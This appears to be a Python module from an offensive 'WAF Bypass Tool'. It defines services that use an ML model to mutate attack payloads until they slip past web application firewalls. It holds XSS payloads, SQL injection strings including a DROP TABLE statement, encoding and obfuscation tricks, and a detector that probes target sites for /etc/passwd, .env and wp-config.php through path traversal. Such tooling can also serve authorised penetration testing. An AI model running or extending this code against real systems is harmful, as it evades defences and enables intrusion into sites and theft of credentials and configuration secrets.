"""
Service implementations for WAF Bypass Tool
Provides concrete implementations of the service interfaces
"""

from typing import List, Optional, Tuple, Any
import requests
import logging
import numpy as np
from interfaces import (
    IMLModel, IPayloadMutator, IInputValidator, IWAFDetector,
    IWAFBypassService, IConfigurationManager, IFeatureExtractor,
    ILogger, IHTTPClient, IErrorHandler
)
from stable_ml import MLConfig
from security import InputValidator, SecureConfig, SecurityConfig
from exceptions import error_handler, ErrorContext
from di_container import get_container
from optimized_features import OptimizedFeatureExtractor
from optimized_ml import OptimizedActorCritic
from optimized_http import OptimizedHTTPClient


class MLModelService(IMLModel):
    """Service wrapper for OptimizedActorCritic"""

    def __init__(self, actor_critic: OptimizedActorCritic, feature_extractor: OptimizedFeatureExtractor):
        self.actor_critic = actor_critic
        self.feature_extractor = feature_extractor

    def choose_action(self, payload: str) -> str:
        """Choose the best action using optimized ML"""
        return self.actor_critic.choose_action(payload)

    def update(self, payload: str, reward: int) -> None:
        """Update the ML model"""
        self.actor_critic.update(payload, reward)

    def get_stats(self) -> dict:
        """Get model statistics"""
        return self.actor_critic.get_stats()


class PayloadMutatorService(IPayloadMutator):
    """Service for payload mutation with validation"""

    def __init__(self, input_validator: IInputValidator, security_config: SecurityConfig):
        self.input_validator = input_validator
        self.security_config = security_config

        # Mutation strategies
        self.mutation_strategies = [
            self.encode_chars,
            self.case_alteration,
            self.inject_noise,
            self.reorder_elements,
            self.url_encode_payload,
            self.base64_encode_payload,
            self.obfuscate_js_payload,
            self.insert_junk_data,
            self.advanced_xss_payload,
            self.advanced_sqli_payload,
        ]

    def mutate(self, payload: str, ml_model: IMLModel) -> str:
        """Mutate payload using ML guidance"""
        with ErrorContext(error_handler, "payload_mutation"):
            # Validate input
            is_valid, result = self.input_validator.validate_payload(payload)
            if not is_valid:
                raise ValueError(result)

            payload = result  # Use sanitized payload

            # Use ML model to choose best mutation strategy
            best_mutation = payload

            # Try different strategies and pick the best one
            for strategy in self._get_random_strategies(min(5, len(self.mutation_strategies))):
                try:
                    mutated = strategy(payload)
                    if len(mutated) <= self.security_config.max_payload_length:
                        best_mutation = mutated
                        break  # For now, pick first valid mutation
                except Exception as e:
                    logging.warning(f"Mutation strategy failed: {e}")
                    continue

            return best_mutation

    def _get_random_strategies(self, count: int):
        """Get random mutation strategies"""
        import random
        return random.sample(self.mutation_strategies, count)

    # Mutation strategy implementations
    def encode_chars(self, payload: str) -> str:
        return payload.replace('<', '%3C').replace('>', '%3E')

    def case_alteration(self, payload: str) -> str:
        return ''.join([c.lower() if c.isupper() else c.upper() for c in payload])

    def inject_noise(self, payload: str) -> str:
        import random
        noise = ''.join(random.choice([' ', '!', '?', '=', '-', '/']) for _ in range(5))
        mid = len(payload) // 2
        return payload[:mid] + noise + payload[mid:]

    def reorder_elements(self, payload: str) -> str:
        if '<script>' in payload.lower():
            return payload.replace('<script>', '<sCrIpT>').replace('</script>', '</sCrIpT>')
        return payload

    def url_encode_payload(self, payload: str) -> str:
        return requests.utils.quote(payload)

    def base64_encode_payload(self, payload: str) -> str:
        import base64
        return base64.b64encode(payload.encode()).decode()

    def obfuscate_js_payload(self, payload: str) -> str:
        if "<script>" in payload.lower():
            return payload.replace("<script>", "<scr+ipt>").replace("</script>", "</scr+ipt>")
        return payload

    def insert_junk_data(self, payload: str) -> str:
        try:
            content_type = "application/x-www-form-urlencoded"
            size_kb = 1

            if "application/x-www-form-urlencoded" in content_type:
                junk_data = "a=" + "0" * (int(size_kb * 1024) - 2) + "&"
            else:
                junk_data = "a=" + "0" * (int(size_kb * 1024) - 2) + "&"

            import random
            insertion_point = random.randint(0, len(payload))
            return payload[:insertion_point] + junk_data + payload[insertion_point:]
        except Exception:
            return payload

    def advanced_xss_payload(self, payload: str) -> str:
        payloads = [
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
        ]
        import random
        return random.choice(payloads)

    def advanced_sqli_payload(self, payload: str) -> str:
        payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' #",
            "1' OR '1'='1' /*",
        ]
        import random
        return random.choice(payloads)


class InputValidatorService(IInputValidator):
    """Service wrapper for InputValidator"""

    def __init__(self, input_validator: InputValidator):
        self.input_validator = input_validator

    def validate_url(self, url: str) -> Tuple[bool, str]:
        return self.input_validator.validate_url(url)

    def validate_payload(self, payload: str) -> Tuple[bool, str]:
        return self.input_validator.validate_payload(payload)

    def validate_file_path(self, file_path: str) -> Tuple[bool, str]:
        return self.input_validator.validate_file_path(file_path)


class WAFDetectorService(IWAFDetector):
    """Service for WAF detection"""

    def __init__(self, http_client: IHTTPClient, input_validator: IInputValidator):
        self.http_client = http_client
        self.input_validator = input_validator

    def detect_waf(self, url: str) -> bool:
        """Detect WAF presence with comprehensive testing"""
        with ErrorContext(error_handler, "waf_detection"):
            # Validate URL
            is_valid, result = self.input_validator.validate_url(url)
            if not is_valid:
                raise ValueError(result)

            validated_url = result

            # Test paths that commonly trigger WAF
            waf_test_paths = [
                "/.git/config",
                "/.env",
                "/wp-config.php",
                "/admin",
                "/phpinfo.php",
                "/etc/passwd",
                "/var/www/html",
                "/index.php?page=../../../../etc/passwd",
                "/index.php?page=../../../../.env",
                "/index.php?page=../../../../wp-config.php",
            ]

            # Test payloads
            waf_test_payloads = [
                "<script>alert(1)</script>",
                "' OR 1=1 --",
                "UNION SELECT null,null,null",
                "../../../../../../etc/passwd",
                "../../../../../../.env",
                "../../../../../wp-config.php",
                "<?php echo 'test'; ?>",
                "'; DROP TABLE users; --",
                "SELECT * FROM users WHERE '1'='1'",
            ]

            # Test paths
            for path in waf_test_paths:
                try:
                    full_url = validated_url.rstrip('/') + path
                    response = self.http_client.get(full_url, timeout=10)
                    if response.status_code in [403, 406]:
                        return True
                except Exception:
                    continue

            # Test payloads
            for payload in waf_test_payloads:
                try:
                    validated_payload = self.input_validator.validate_payload(payload)[1]
                    response = self.http_client.get(validated_url, params={"q": validated_payload}, timeout=10)
                    if response.status_code in [403, 406]:
                        return True
                except Exception:
                    continue

            return False


class HTTPClientService(IHTTPClient):
    """Service wrapper for OptimizedHTTPClient"""

    def __init__(self, http_client: OptimizedHTTPClient):
        self.http_client = http_client

    def get(self, url: str, **kwargs) -> requests.Response:
        return self.http_client.get(url, **kwargs)

    def post(self, url: str, **kwargs) -> requests.Response:
        return self.http_client.post(url, **kwargs)


class LoggerService(ILogger):
    """Service wrapper for logging"""

    def __init__(self, name: str = "waf_bypass"):
        self.logger = logging.getLogger(name)

    def debug(self, message: str, **kwargs) -> None:
        self.logger.debug(message, **kwargs)

    def info(self, message: str, **kwargs) -> None:
        self.logger.info(message, **kwargs)

    def warning(self, message: str, **kwargs) -> None:
        self.logger.warning(message, **kwargs)

    def error(self, message: str, **kwargs) -> None:
        self.logger.error(message, **kwargs)

    def critical(self, message: str, **kwargs) -> None:
        self.logger.critical(message, **kwargs)


class ErrorHandlerService(IErrorHandler):
    """Service wrapper for error handler"""

    def handle_exception(self, exception: Exception, context: Optional[dict] = None) -> Optional[Any]:
        return error_handler.handle_exception(exception, context)

    def get_error_stats(self) -> dict:
        return error_handler.get_error_stats()


class FeatureExtractorService(IFeatureExtractor):
    """Service wrapper for feature extraction"""

    def __init__(self, extractor_func):
        self.extractor_func = extractor_func

    def extract_features(self, payload: str) -> np.ndarray:
        return self.extractor_func(payload)
